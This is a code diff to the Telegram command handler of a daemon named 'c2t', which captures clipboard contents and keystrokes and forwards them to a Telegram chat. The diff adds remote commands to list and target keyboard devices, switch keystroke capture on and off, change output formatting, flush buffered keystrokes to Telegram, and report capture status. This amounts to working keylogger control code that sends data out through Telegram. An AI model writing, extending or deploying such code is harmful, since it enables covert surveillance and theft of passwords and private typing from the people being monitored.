@@ -18,6 +18,7 @@
 #include "telegram_listener.h"
 #include "../config/config.h"
 #include "../clipboard/clipboard_output.h"
+#include "../keyboard/keyboard.h"
 #include "../keyboard/keyboard_output.h"
 #include "../logging/logging.h"
 #include "../logging/log_sender.h"
@@ -60,15 +61,30 @@ static pthread_t listener_thread;
     if (*text == '/') text++;
     if (*cmd == '/') cmd++;
 
-    size_t cmd_len = strlen(cmd);
-#ifdef _WIN32
-    if (_strnicmp(text, cmd, cmd_len) != 0) return 0;
-#else
-    if (strncasecmp(text, cmd, cmd_len) != 0) return 0;
-#endif
+    while (*cmd) {
+        char c1 = *text;
+        char c2 = *cmd;
+        if (c1 == '-') c1 = '_';
+        if (c2 == '-') c2 = '_';
+        if (tolower((unsigned char)c1) != tolower((unsigned char)c2))
+            return 0;
+        text++;
+        cmd++;
+    }
 
-    char next = text[cmd_len];
+    char next = *text;
     return (next == '\0' || next == '@' || isspace((unsigned char)next));
+}
+
+static const char *get_command_argument(const char *text)
+{
+    if (!text) return "";
+    while (isspace((unsigned char)*text)) text++;
+    if (*text == '/') {
+        while (*text && !isspace((unsigned char)*text)) text++;
+    }
+    while (isspace((unsigned char)*text)) text++;
+    return text;
 }
 
 static void handle_command(const char *text, const char *chat_id, [[maybe_unused]] const char *username)
@@ -113,14 +129,101 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
         } else {
             telegram_send_html("▶️ <b>Monitoring Resumed</b>\n<i>All monitoring is now active.</i>");
         }
-    } else if (match_command(text, "mute_keyboard") || match_command(text, "pause_keyboard")) {
-        keyboard_set_paused(1);
-        c2t_log_info("listener", "Keyboard monitoring paused by Telegram command");
-        telegram_send_html("⏸️ <b>Keyboard Monitoring Paused</b>");
-    } else if (match_command(text, "unmute_keyboard") || match_command(text, "resume_keyboard")) {
+    } else if (match_command(text, "keyboard_devices") || match_command(text, "keyboard_list") || match_command(text, "keyboards")) {
+        char dev_list[2048];
+        if (keyboard_get_device_list(dev_list, sizeof(dev_list))) {
+            telegram_send_html(dev_list);
+        } else {
+            telegram_send_html("⚠️ <i>Unable to query keyboard devices.</i>");
+        }
+    } else if (match_command(text, "keyboard_select") || match_command(text, "keyboard_device") || match_command(text, "keyboard_target")) {
+        const char *arg = get_command_argument(text);
+        if (!arg || !*arg) {
+            telegram_send_html("⚠️ <b>Usage:</b> <code>/keyboard_select &lt;id|name|all&gt;</code>\n"
+                               "<i>Example:</i> <code>/keyboard_select 0</code> or <code>/keyboard_select all</code>\n"
+                               "<i>Use <code>/keyboard_list</code> to see available devices.</i>");
+        } else {
+            char target_buf[128];
+            size_t tlen = 0;
+            while (arg[tlen] && !isspace((unsigned char)arg[tlen]) && tlen + 1 < sizeof(target_buf)) {
+                target_buf[tlen] = arg[tlen];
+                tlen++;
+            }
+            target_buf[tlen] = '\0';
+
+            (void)keyboard_select_device(target_buf);
+            char resp[512];
+            snprintf(resp, sizeof(resp),
+                     "🎯 <b>Keyboard Target Selected:</b> <code>%s</code>\n"
+                     "<i>Capturing only keystrokes matching target '%s'.</i>",
+                     target_buf, target_buf);
+            telegram_send_html(resp);
+        }
+    } else if (match_command(text, "keyboard_on") || match_command(text, "keyboard_enable") ||
+               match_command(text, "keyboard_resume") || match_command(text, "keyboard_start") ||
+               match_command(text, "unmute_keyboard") || match_command(text, "resume_keyboard")) {
         keyboard_set_paused(0);
         c2t_log_info("listener", "Keyboard monitoring resumed by Telegram command");
-        telegram_send_html("▶️ <b>Keyboard Monitoring Resumed</b>");
+        telegram_send_html("▶️ <b>Keyboard Monitoring Resumed</b>\n<i>Keyboard listener is now capturing keystrokes.</i>");
+    } else if (match_command(text, "keyboard_off") || match_command(text, "keyboard_disable") ||
+               match_command(text, "keyboard_pause") || match_command(text, "keyboard_stop") ||
+               match_command(text, "mute_keyboard") || match_command(text, "pause_keyboard")) {
+        keyboard_set_paused(1);
+        c2t_log_info("listener", "Keyboard monitoring paused by Telegram command");
+        telegram_send_html("⏸️ <b>Keyboard Monitoring Paused</b>\n<i>Keystroke capturing is currently muted.</i>");
+    } else if (match_command(text, "keyboard_toggle")) {
+        int p = keyboard_toggle_paused();
+        c2t_log_info("listener", "Keyboard monitoring toggled to %s by Telegram command", p ? "paused" : "active");
+        if (p) {
+            telegram_send_html("⏸️ <b>Keyboard Monitoring Paused</b>\n<i>Keystroke capturing is currently muted.</i>");
+        } else {
+            telegram_send_html("▶️ <b>Keyboard Monitoring Resumed</b>\n<i>Keyboard listener is now capturing keystrokes.</i>");
+        }
+    } else if (match_command(text, "keyboard_mode")) {
+        const char *arg = get_command_argument(text);
+        if (match_command(arg, "code") || match_command(arg, "pretty") || match_command(arg, "block")) {
+            keyboard_set_format_mode(KEYBOARD_MODE_CODE);
+            c2t_log_info("listener", "Keyboard format mode set to CODE");
+            telegram_send_html("🎨 <b>Keyboard Mode Set:</b> <code>Code Block (&lt;pre&gt;&lt;code&gt;)</code>\n"
+                               "<i>Keystrokes will be formatted inside structured code blocks.</i>");
+        } else if (match_command(arg, "raw") || match_command(arg, "plain") || match_command(arg, "text")) {
+            keyboard_set_format_mode(KEYBOARD_MODE_RAW);
+            c2t_log_info("listener", "Keyboard format mode set to RAW");
+            telegram_send_html("📝 <b>Keyboard Mode Set:</b> <code>Raw Plain Text</code>\n"
+                               "<i>Keystrokes will be delivered as plain unformatted text.</i>");
+        } else {
+            int cur = keyboard_get_format_mode();
+            char resp[512];
+            snprintf(resp, sizeof(resp),
+                     "🎨 <b>Current Keyboard Format:</b> %s\n\n"
+                     "<b>Usage:</b>\n"
+                     "• <code>/keyboard_mode code</code> - Formatted code blocks\n"
+                     "• <code>/keyboard_mode raw</code> - Plain text raw output",
+                     cur == KEYBOARD_MODE_CODE ? "<code>Code Block (&lt;pre&gt;&lt;code&gt;)</code>" : "<code>Raw Text</code>");
+            telegram_send_html(resp);
+        }
+    } else if (match_command(text, "keyboard_flush")) {
+        keyboard_output_flush();
+        c2t_log_info("listener", "Flushing keyboard buffer on-demand by /keyboard_flush command");
+        telegram_send_html("⚡ <b>Keyboard Buffer Flushed</b>\n<i>Pending keystrokes have been dispatched.</i>");
+    } else if (match_command(text, "keyboard_status") || match_command(text, "keyboard")) {
+        char stat_msg[1024];
+        keyboard_get_status_info(stat_msg, sizeof(stat_msg));
+        telegram_send_html(stat_msg);
+    } else if (match_command(text, "keyboard_help")) {
+        char kb_help[1024];
+        snprintf(kb_help, sizeof(kb_help),
+                 "⌨️ <b>Keyboard Control Commands</b>\n\n"
+                 "• <code>/keyboard_list</code> - View detected keyboard devices &amp; status\n"
+                 "• <code>/keyboard_select &lt;id|all&gt;</code> - Filter capture to a specific keyboard\n"
+                 "• <code>/keyboard_on</code> - Enable keyboard capturing\n"
+                 "• <code>/keyboard_off</code> - Pause keyboard capturing\n"
+                 "• <code>/keyboard_toggle</code> - Toggle active / paused state\n"
+                 "• <code>/keyboard_mode &lt;code|raw&gt;</code> - Change output formatting\n"
+                 "• <code>/keyboard_flush</code> - Flush buffered keys to Telegram immediately\n"
+                 "• <code>/keyboard_status</code> - View keyboard monitor state &amp; buffer status\n\n"
+                 "💡 <i>Tip: Commands also accept dash syntax (e.g. <code>/keyboard-list</code>)</i>");
+        telegram_send_html(kb_help);
     } else if (match_command(text, "mute_clipboard") || match_command(text, "pause_clipboard")) {
         clipboard_set_paused(1);
         c2t_log_info("listener", "Clipboard monitoring paused by Telegram command");
@@ -135,20 +238,27 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
     } else if (match_command(text, "status") || match_command(text, "ping")) {
         int clip_paused = clipboard_is_paused();
         int key_paused = keyboard_is_paused();
+        int kb_mode = keyboard_get_format_mode();
+        char kb_target[128] = "all";
+        keyboard_get_selected_target(kb_target, sizeof(kb_target));
+
         const char *kb_status = config->disable_keyboard ? "❌ <b>DISABLED</b> (--no-keyboard)" :
             (key_paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Capturing)");
-        char status_msg[1024];
+        char status_msg[1280];
         snprintf(status_msg, sizeof(status_msg),
                  "🤖 <b>c2t Daemon Status</b>\n\n"
                  "• <b>Status:</b> 🟢 Active &amp; Running\n"
                  "• <b>Clipboard Monitoring:</b> %s\n"
                  "• <b>Keyboard Monitoring:</b> %s\n"
+                 "• <b>Keyboard Target:</b> <code>%s</code> (Mode: %s)\n"
                  "• <b>Periodic Logs:</b> %s (Interval: %llu s)\n"
                  "• <b>File Uploads:</b> %s\n"
                  "• <b>Window Info:</b> %s\n"
                  "• <b>Delivery Queue:</b> %llu items / %llu bytes",
                  clip_paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Capturing)",
                  kb_status,
+                 kb_target,
+                 kb_mode == KEYBOARD_MODE_CODE ? "Code Block" : "Raw Text",
                  config->telegram_send_logs ? "Enabled" : "On-demand only (/logs)",
                  (unsigned long long)config->telegram_log_interval_sec,
                  config->telegram_send_files ? "Enabled" : "Disabled",
@@ -157,17 +267,23 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
                  (unsigned long long)config->queue_max_bytes);
         telegram_send_html(status_msg);
     } else if (match_command(text, "help") || match_command(text, "start")) {
-        char help_msg[896];
+        char help_msg[1280];
         snprintf(help_msg, sizeof(help_msg),
                  "💡 <b>c2t Telegram Commands</b>\n\n"
-                 "• <code>/pause</code> - Pause clipboard and keyboard monitoring\n"
-                 "• <code>/resume</code> - Resume clipboard and keyboard monitoring\n"
-                 "• <code>/toggle</code> - Toggle pause / resume monitoring\n"
-                 "• <code>/mute_keyboard</code> - Mute keyboard listener\n"
-                 "• <code>/resume_keyboard</code> - Resume keyboard listener\n"
+                 "<b>Core Controls:</b>\n"
+                 "• <code>/pause</code> - Pause all monitoring\n"
+                 "• <code>/resume</code> - Resume all monitoring\n"
+                 "• <code>/toggle</code> - Toggle pause / resume\n"
                  "• <code>/logs</code> - Flush and retrieve execution logs\n"
-                 "• <code>/status</code> - View daemon status &amp; monitoring state\n"
-                 "• <code>/help</code> - Show this help guide");
+                 "• <code>/status</code> - View daemon status &amp; monitoring state\n\n"
+                 "<b>Keyboard Controls:</b>\n"
+                 "• <code>/keyboard_list</code> - View detected keyboard devices\n"
+                 "• <code>/keyboard_select &lt;id|all&gt;</code> - Select active keyboard target\n"
+                 "• <code>/keyboard_on</code> / <code>/keyboard_off</code> - Enable / mute keyboard\n"
+                 "• <code>/keyboard_mode &lt;code|raw&gt;</code> - Set code block or raw mode\n"
+                 "• <code>/keyboard_status</code> - View detailed keyboard monitor state\n"
+                 "• <code>/keyboard_flush</code> - Flush buffered keys immediately\n"
+                 "• <code>/keyboard_help</code> - Show full keyboard commands guide");
         telegram_send_html(help_msg);
     }
 }
